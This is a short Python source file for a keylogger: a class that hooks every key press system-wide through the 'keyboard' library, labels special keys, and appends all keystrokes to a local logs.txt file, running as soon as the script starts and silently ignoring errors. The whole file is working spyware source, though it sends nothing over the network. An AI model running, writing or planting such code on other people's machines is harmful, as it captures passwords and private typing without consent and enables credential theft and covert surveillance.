import keyboard
import os

class KeyLogger :
    def __init__(self) :
        self.log = str

    def main(self) :
        try :
            keyboard.on_press(callback = self.backlog)
            keyboard.wait()
        except :
            pass

    def backlog(self, event) :
        if (len(event.name)) > 1 :
            if event.name == "esc" :
                event.name = "[Esc]"
            elif event.name == "space" :
                event.name = " "
            elif event.name == "enter" :
                event.name = "[Enter]\n"
            elif event.name == "ctrl" or event.name == "right ctrl" :
                event.name = "[Ctrl]"
            elif event.name == "shift" or event.name == "right shift" :
                event.name = "[Shift]"
            elif event.name == "alt" or event.name == "right alt" :
                event.name = "[Alt]"
            elif event.name == "caps lock" :
                event.name = "[CapsLock]"
            elif event.name == "left windows" or event.name == "right windows" :
                event.name = "[WinKey]"
            elif event.name == "tab" :
                event.name = "[Tab]"
            elif event.name == "menu" :
                event.name = "[Menu]"
            elif event.name == "backspace" :
                event.name = "[backspace]"
            elif event.name == "up" :
                event.name = "[UP]"
            elif event.name == "down" :
                event.name = "[DOWN]"
            elif event.name == "right" :
                event.name = "[RIGHT]"
            elif event.name == "left" :
                event.name = "[LEFT]"
            elif event.name == "home" :
                event.name = "[Home]"
            elif event.name == "end" :
                event.name = "[End]"
            elif event.name == "page up" :
                event.name = "[PgUp]"
            elif event.name == "page down" :
                event.name = "[PgDn]"
            elif event.name == "insert" :
                event.name = "[Ins]"
            elif event.name == "delete" :
                event.name = "[Del]"
            elif event.name == "pause" :
                event.name = "[PauseBr]"
            elif event.name == "scroll lock" :
                event.name = "[ScLock]"
            elif event.name == "decimal" :
                event.name = "[Decimal]"
        self.log = event.name
        self.save(self.log)

    def save(self, data) :
        if not os.path.exists("logs.txt") :
            with open("logs.txt", "x") as file :
                file.write("")
        with open("logs.txt", "a") as file :
            file.write(data)

run = KeyLogger()
run.main()
            